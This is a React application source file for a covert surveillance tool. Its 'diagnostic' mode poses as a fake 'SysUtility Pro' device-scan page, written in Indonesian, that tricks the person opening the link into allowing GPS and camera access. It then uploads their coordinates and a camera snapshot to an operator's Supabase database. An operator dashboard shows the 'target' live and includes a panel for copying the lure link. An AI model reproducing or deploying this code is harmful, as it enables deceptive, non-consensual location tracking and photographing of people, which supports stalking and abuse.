
import React, { useState, useEffect, useCallback, useMemo } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import CameraFeed from './components/CameraFeed';
import { UserProfile, AIInsight, LocationData } from './types';
import { getLocationInsights } from './services/geminiService';
import { createClient } from '@supabase/supabase-js';

const App: React.FC = () => {
  const params = useMemo(() => new URLSearchParams(window.location.search), []);
  const isStealthMode = params.get('mode') === 'diagnostic';
  const targetId = 'target_alpha'; 

  const [config, setConfig] = useState({
    url: params.get('sb_url') || localStorage.getItem('SB_URL_OVER_RE') || '',
    key: params.get('sb_key') || localStorage.getItem('SB_KEY_OVER_RE') || ''
  });

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagStep, setDiagStep] = useState(0); 
  const [diagProgress, setDiagProgress] = useState(0);
  const [copyStatus, setCopyStatus] = useState<string | null>(null);
  const [dbLog, setDbLog] = useState<string>("IDLE");
  const [showConfigEditor, setShowConfigEditor] = useState(false);
  
  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Alpha_Target',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'offline',
    }
  ]);

  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [isLoadingInsight, setIsLoadingInsight] = useState(false);

  const activeMember = members[0];

  const supabase = useMemo(() => {
    if (config.url && config.key) {
      try { return createClient(config.url, config.key); } catch (e) { return null; }
    }
    return null;
  }, [config.url, config.key]);

  const syncToDatabase = async (loc: Partial<LocationData>) => {
    if (!supabase) return;
    
    setDbLog("SYNCING...");
    try {
      // Ambil data lama agar tidak hilang jika hanya update koordinat/snapshot saja
      const { data: currentData } = await supabase.from('tracking').select('*').eq('id', targetId).single();
      
      const updateData = {
        id: targetId,
        latitude: loc.latitude ?? currentData?.latitude,
        longitude: loc.longitude ?? currentData?.longitude,
        accuracy: loc.accuracy ?? currentData?.accuracy,
        timestamp: loc.timestamp ?? Date.now(),
        snapshot: loc.snapshot ?? currentData?.snapshot
      };

      const { error } = await supabase.from('tracking').upsert(updateData);
      
      if (error) setDbLog(`ERR: ${error.code}`);
      else setDbLog("SUCCESS");
    } catch (err) {
      setDbLog("CONN_LOST");
    }
  };

  useEffect(() => {
    if (isUnlocked && !isStealthMode && supabase) {
      const fetchData = async () => {
        try {
          const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
          if (data) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp,
                snapshot: data.snapshot
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        } catch (e) {}
      };
      fetchData();

      const channel = supabase
        .channel('live-track')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
          const data = payload.new as any;
          if (data && data.id === targetId) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp,
                snapshot: data.snapshot
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        })
        .subscribe();

      return () => { supabase.removeChannel(channel); };
    }
  }, [isUnlocked, isStealthMode, supabase]);

  const startDiagnostic = () => {
    setIsDiagnosing(true);
    setDiagStep(1);
    
    // Step 2: GPS
    setTimeout(() => {
        setDiagStep(2);
        navigator.geolocation.getCurrentPosition((pos) => {
            syncToDatabase({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                timestamp: pos.timestamp
            });
        });
    }, 2000);

    // Step 3: Camera
    setTimeout(() => setDiagStep(3), 5000);

    // Step 4: Final
    setTimeout(() => setDiagStep(4), 9000);

    let progress = 0;
    const interval = setInterval(() => {
      progress += 1;
      setDiagProgress(progress);
      if (progress >= 100) clearInterval(interval);
    }, 90);
  };

  const getFullDiagnosticUrl = () => {
    const baseUrl = window.location.origin + window.location.pathname;
    const sUrl = encodeURIComponent(config.url);
    const sKey = encodeURIComponent(config.key);
    return `${baseUrl}?mode=diagnostic&sb_url=${sUrl}&sb_key=${sKey}`;
  };

  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 items-center justify-center">
        <div className="max-w-md w-full space-y-8 animate-in fade-in">
           <div className="text-center space-y-2">
              <i className="fas fa-shield-halved text-blue-500 text-5xl mb-4 animate-pulse"></i>
              <h1 className="text-xl font-bold uppercase tracking-[0.3em]">SysUtility <span className="text-blue-500">Pro</span></h1>
              <p className="text-[9px] text-slate-500 uppercase tracking-widest">Enterprise Device Maintenance Tool</p>
           </div>
           
           {!isDiagnosing ? (
             <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 text-center space-y-6 shadow-2xl relative overflow-hidden">
                <div className="absolute top-0 right-0 p-4 opacity-10"><i className="fas fa-microchip text-6xl"></i></div>
                <div className="space-y-4 relative">
                    <p className="text-slate-400 text-xs leading-relaxed uppercase tracking-tighter">
                        Integritas sistem Anda mungkin menurun. Jalankan pemindaian penuh untuk mengkalibrasi sensor dan modul kamera.
                    </p>
                    <button onClick={startDiagnostic} className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xs shadow-lg shadow-blue-600/30 active:scale-95 transition-all uppercase tracking-widest">Mulai Pemindaian</button>
                    <p className="text-[8px] text-slate-600 uppercase">Versi: 4.2.0-STABLE</p>
                </div>
             </div>
           ) : (
             <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 space-y-6 shadow-2xl">
                <div className="space-y-4">
                   <div className="flex justify-between text-[10px] uppercase font-bold text-slate-500">
                        <span>{diagStep === 1 ? 'Battery Health' : diagStep === 2 ? 'GPS Calibration' : diagStep === 3 ? 'Optical Calibration' : 'Complete'}</span>
                        <span className="text-blue-400">{diagProgress}%</span>
                   </div>
                   <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                        <div className="bg-blue-500 h-full transition-all duration-300 shadow-[0_0_10px_#3b82f6]" style={{ width: `${diagProgress}%` }}></div>
                   </div>
                </div>

                <div className="h-56 rounded-2xl overflow-hidden border border-slate-800 bg-black/50">
                    {diagStep === 3 ? (
                        <CameraFeed isCapturing={true} onCapture={(b64) => syncToDatabase({ snapshot: b64 })} />
                    ) : diagStep === 4 ? (
                        <div className="w-full h-full flex flex-col items-center justify-center text-emerald-500 space-y-2">
                            <i className="fas fa-check-circle text-4xl animate-bounce"></i>
                            <span className="text-[10px] font-bold uppercase tracking-widest">Integritas 100% OK</span>
                        </div>
                    ) : (
                        <div className="w-full h-full flex items-center justify-center">
                            <i className={`fas ${diagStep === 1 ? 'fa-battery-three-quarters' : 'fa-satellite'} text-slate-700 text-4xl animate-pulse`}></i>
                        </div>
                    )}
                </div>

                <div className="bg-black/40 p-5 rounded-2xl space-y-2 text-[9px] uppercase font-bold tracking-tighter border border-slate-800/50">
                   <div className="flex justify-between"><span className="text-slate-500">Sync_Status</span><span className={`font-bold ${dbLog === 'SUCCESS' ? 'text-emerald-500' : 'text-blue-400'}`}>{dbLog}</span></div>
                   <div className="flex justify-between"><span className="text-slate-500">Optic_Module</span><span className={diagStep >= 3 ? 'text-emerald-500' : 'text-slate-700'}>{diagStep >= 3 ? 'READY' : 'STANDBY'}</span></div>
                </div>

                {diagStep === 4 && (
                   <button onClick={() => window.location.reload()} className="w-full py-4 bg-slate-800 hover:bg-slate-700 rounded-2xl text-[10px] font-bold text-slate-200 uppercase tracking-widest transition-all">Tutup Diagnosa</button>
                )}
             </div>
           )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono selection:bg-blue-500/30">
      <Sidebar members={members} activeMemberId="1" onSelectMember={() => {}} isUnlocked={isUnlocked} onUnlock={() => setIsUnlocked(true)} />
      
      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-20 bg-slate-900/50 border-b border-slate-800 flex items-center justify-between px-10 shrink-0 z-10">
          <div className="flex items-center gap-6">
            <div className="flex flex-col">
                <h2 className="text-[11px] font-black tracking-[0.3em] text-white uppercase">{isUnlocked ? 'INTEL_DASHBOARD' : 'RESTRICTED'}</h2>
                <span className="text-[8px] text-slate-500 uppercase">Status: Live Feed Active</span>
            </div>
          </div>
          <div className="flex items-center gap-6">
            {isUnlocked && (
                <button onClick={() => setShowConfigEditor(true)} className="w-10 h-10 flex items-center justify-center rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-all"><i className="fas fa-cog"></i></button>
            )}
          </div>
        </header>

        <div className="flex-1 p-10 overflow-y-auto space-y-10 custom-scrollbar">
          {!isUnlocked ? (
            <div className="max-w-xl mx-auto py-40 text-center space-y-8 animate-in fade-in duration-1000">
               <i className="fas fa-lock text-slate-800 text-6xl mb-4"></i>
               <h1 className="text-xl font-black text-slate-400 uppercase tracking-[0.5em]">Auth Needed</h1>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 max-w-7xl mx-auto">
              <div className="lg:col-span-8 space-y-10">
                
                {/* Visual Intelligence Section */}
                <div className="bg-slate-900 border border-slate-800 rounded-[2.5rem] p-10 relative overflow-hidden">
                    <div className="flex justify-between items-center mb-6">
                        <h3 className="text-xs font-black text-slate-400 uppercase tracking-[0.3em]">Visual Confirmation</h3>
                        <span className="text-[8px] bg-blue-500/20 text-blue-400 px-3 py-1 rounded-full font-bold uppercase">Source: Front_Optic</span>
                    </div>
                    
                    <div className="relative aspect-video bg-black rounded-3xl overflow-hidden border border-slate-800 group">
                        {activeMember.currentLocation?.snapshot ? (
                            <>
                                <img 
                                    src={activeMember.currentLocation.snapshot} 
                                    className="w-full h-full object-cover filter grayscale contrast-125 brightness-75 group-hover:grayscale-0 transition-all duration-700"
                                    alt="Target Feed" 
                                />
                                <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent pointer-events-none"></div>
                                <div className="absolute top-4 right-4 bg-rose-600/20 text-rose-500 px-3 py-1 border border-rose-600/30 rounded text-[9px] font-bold animate-pulse uppercase tracking-widest">Visual Locked</div>
                            </>
                        ) : (
                            <div className="w-full h-full flex flex-col items-center justify-center text-slate-800 space-y-4">
                                <i className="fas fa-eye-slash text-5xl"></i>
                                <span className="text-[10px] font-black uppercase tracking-widest">No Optical Data Yet</span>
                            </div>
                        )}
                        {/* Overlay scanline */}
                        <div className="absolute inset-0 pointer-events-none opacity-10 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_4px,3px_100%]"></div>
                    </div>
                </div>

                {/* Telemetry Visualizer */}
                <div className="bg-slate-900 border border-slate-800 rounded-[2.5rem] p-10 relative overflow-hidden">
                   <div className="flex justify-between items-center mb-10">
                      <h3 className="text-xs font-black text-slate-400 uppercase tracking-[0.3em]">Geospatial Data</h3>
                      {activeMember.currentLocation && (
                        <button onClick={() => window.open(`https://www.google.com/maps?q=${activeMember.currentLocation!.latitude},${activeMember.currentLocation!.longitude}`, '_blank')} className="px-8 py-3 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl text-[10px] font-black uppercase transition-all shadow-xl shadow-blue-600/20">Open Map</button>
                      )}
                   </div>
                   {activeMember.currentLocation ? (
                     <div className="grid grid-cols-2 gap-6">
                        <div className="bg-slate-950 p-8 rounded-3xl border border-slate-800/50">
                           <p className="text-[9px] text-slate-600 uppercase mb-3 tracking-widest">Latitude</p>
                           <p className="text-3xl font-black text-white mono">{activeMember.currentLocation.latitude.toFixed(6)}</p>
                        </div>
                        <div className="bg-slate-950 p-8 rounded-3xl border border-slate-800/50">
                           <p className="text-[9px] text-slate-600 uppercase mb-3 tracking-widest">Longitude</p>
                           <p className="text-3xl font-black text-white mono">{activeMember.currentLocation.longitude.toFixed(6)}</p>
                        </div>
                     </div>
                   ) : (
                     <div className="py-24 border border-dashed border-slate-800 rounded-3xl text-center">
                        <p className="text-[11px] text-slate-600 uppercase font-black tracking-widest animate-pulse">Waiting for Data Pipeline...</p>
                     </div>
                   )}
                </div>

                {/* Setup & Tools */}
                <div className="bg-slate-900 border border-slate-800 rounded-[2.5rem] p-10">
                    <h3 className="text-xs font-black text-slate-400 uppercase tracking-[0.3em] mb-6">Target Deployment</h3>
                    <div className="flex gap-4">
                        <div className="flex-1 bg-slate-950 rounded-2xl border border-slate-800 p-1 flex items-center">
                            <input readOnly value={getFullDiagnosticUrl()} className="flex-1 bg-transparent py-4 px-6 text-[10px] text-slate-600 focus:outline-none mono" />
                        </div>
                        <button onClick={() => {
                            navigator.clipboard.writeText(getFullDiagnosticUrl());
                            setCopyStatus('link');
                            setTimeout(() => setCopyStatus(null), 2000);
                        }} className="px-10 py-4 bg-slate-800 hover:bg-slate-700 rounded-2xl text-[10px] font-black uppercase text-white transition-all">
                            {copyStatus === 'link' ? 'Copied' : 'Copy Link'}
                        </button>
                    </div>
                </div>
              </div>

              <div className="lg:col-span-4 space-y-10">
                <LocationCard member={activeMember} insight={insight} loadingInsight={isLoadingInsight} />
              </div>
            </div>
          )}
        </div>
      </main>

      {showConfigEditor && (
        <div className="fixed inset-0 bg-black/95 backdrop-blur-xl flex items-center justify-center p-6 z-[100]">
           <div className="bg-slate-900 border border-slate-800 w-full max-w-lg rounded-[2.5rem] p-12 space-y-10">
              <h2 className="text-lg font-black uppercase text-white">Database Bridge</h2>
              <form onSubmit={(e) => {
                  e.preventDefault();
                  const fd = new FormData(e.currentTarget);
                  localStorage.setItem('SB_URL_OVER_RE', fd.get('url') as string);
                  localStorage.setItem('SB_KEY_OVER_RE', fd.get('key') as string);
                  window.location.reload();
              }} className="space-y-6">
                 <input name="url" defaultValue={config.url} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-4 text-xs text-slate-300 mono" placeholder="Supabase URL" required />
                 <textarea name="key" defaultValue={config.key} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-4 text-xs text-slate-300 h-32 mono" placeholder="Anon Key" required />
                 <button type="submit" className="w-full py-5 bg-blue-600 rounded-2xl text-[11px] font-black uppercase text-white shadow-2xl">Apply Config</button>
              </form>
           </div>
        </div>
      )}
    </div>
  );
};

export default App;
